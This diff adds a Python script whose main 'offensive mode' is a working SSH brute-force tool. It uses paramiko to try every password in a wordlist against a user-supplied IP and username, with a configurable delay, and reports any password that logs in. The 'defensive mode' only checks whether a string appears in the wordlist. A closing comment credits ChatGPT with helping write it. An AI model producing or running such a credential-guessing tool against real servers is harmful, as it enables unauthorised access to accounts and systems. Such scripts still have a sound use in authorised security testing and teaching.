@@ -1,0 +1,53 @@
+import time
+import paramiko
+
+def ssh_brute_force(ip_address, username, wordlist_path, delay):
+    with open(wordlist_path, 'r') as f:
+        for password in f:
+            password = password.strip()
+            print(f"Trying password: {password}")
+            ssh = paramiko.SSHClient()
+            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+            try:
+                ssh.connect(ip_address, username=username, password=password, timeout=5)
+                print(f"Successful login with password: {password}")
+                ssh.close()
+                return password
+            except:
+                pass
+            time.sleep(delay)
+    return None
+
+def offensive_mode():
+    ip_address = input("Enter SSH server IP address: ")
+    username = input("Enter SSH username: ")
+    wordlist_path = input("Enter word list file path: ")
+    delay = int(input("Enter delay between words (in seconds): "))
+
+    password = ssh_brute_force(ip_address, username, wordlist_path, delay)
+    if password:
+        print(f"Successfully logged in with password: {password}")
+    else:
+        print("Could not find valid password in word list")
+
+def defensive_mode():
+    user_input = input("Enter a string: ")
+    wordlist_path = input("Enter word list file path: ")
+
+    with open(wordlist_path, 'r') as f:
+        wordlist = f.read().splitlines()
+        if user_input in wordlist:
+            print("Password recognized")
+        else:
+            print("Password not recognized")
+
+mode = input("Select a mode (1 for Offensive, 2 for Defensive): ")
+
+if mode == '1':
+    offensive_mode()
+elif mode == '2':
+    defensive_mode()
+else:
+    print("Invalid mode selected")
+
+#this script was written with the help of chat gpt
